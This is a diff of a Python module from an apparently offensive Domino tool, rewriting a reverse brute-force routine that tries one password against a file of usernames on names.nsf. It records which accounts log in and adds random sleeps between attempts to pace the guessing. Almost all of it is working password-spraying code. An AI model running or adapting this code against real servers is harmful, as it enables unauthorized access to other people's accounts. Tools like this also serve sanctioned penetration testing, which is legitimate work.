@@ -17,71 +17,55 @@
 # LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
+import os
 import random
-import re
-import requests
 import time
-
-from domi_owned import utility
-
-try:
-	requests.packages.urllib3.disable_warnings()
-except:
-	pass
+import tqdm
 
 
-# Preform a reverse brute force against names.nsf
-def reverse_bruteforce(target, usernames, password, auth):
-	username_list = []
-	valid_usernames = []
+class BruteForce(object):
+	"""Perform a reverse brute force attack with multiple usernames and one password"""
 
-	names_url = "{0}/names.nsf".format(target)
+	def __init__(self, domiowned, usernames, password):
+		self.domiowned = domiowned
+		self.usernames = usernames
+		self.password = password
 
-	# Import usernames from file
-	username_file = open(usernames, 'r')
-	for username in username_file:
-		username_list.append(username.rstrip())
-	username_file.close()
+		self.valid_accounts = []
 
-	# Start reverse brute force
-	for username in username_list:
-		jitter = random.random()
-		time.sleep(jitter)
-		try:
-			if auth == 'basic':
-				access = utility.basic_auth(names_url, username, password)
-			elif auth == 'form':
-				access, session = utility.form_auth(names_url, username, password)
-			elif auth == 'open':
-				utility.print_good("{0} does not require authentication".format(names_url))
+	def bruteforce(self):
+		# Import usernames from file
+		f = open(os.path.abspath(self.usernames), 'r').read()
+		username_list = f.rstrip().split('\n')
+
+		# Setup progress bar
+		progress_bar = tqdm.tqdm(
+			total=len(username_list),
+			desc="Progress",
+			smoothing=0.5,
+			bar_format='{desc}{percentage:3.0f}%|{bar}|{elapsed} '
+		)
+
+		# Start reverse brute force
+		for username in username_list:
+			self.domiowned.data = {}
+			self.domiowned.session.cookies.clear()
+			try:
+				has_access = self.domiowned.get_access(username, self.password)
+				if has_access['names.nsf']:
+					self.valid_accounts.append(username)
+
+			except KeyboardInterrupt:
 				break
-			else:
-				utility.print_warn("Could not find {0}".format(names_url))
+
+			except Exception as error:
+				print(error)
+				self.valid_accounts = False
 				break
 
-			if access:
-				utility.print_good("Valid account: {0} {1}".format(username, password))
-				valid_usernames.append(username)
-			else:
-				pass
+			progress_bar.update(1)
+			time.sleep(random.random())
 
-		except KeyboardInterrupt:
-			break
+		progress_bar.close()
 
-		except Exception as error:
-			utility.print_error("Error: {0}".format(error))
-			continue
-
-	# Print found usernames
-	if len(valid_usernames) > 0:
-		if len(valid_usernames) == 1:
-			plural = ''
-		else:
-			plural = 's'
-
-		utility.print_status("Found {0} valid account{1}".format(len(valid_usernames), plural))
-
-		for valid_username in valid_usernames:
-			print("{0} {1}".format(valid_username, password))
-	else:
-		utility.print_warn('No valid accounts found')
+		return self.valid_accounts
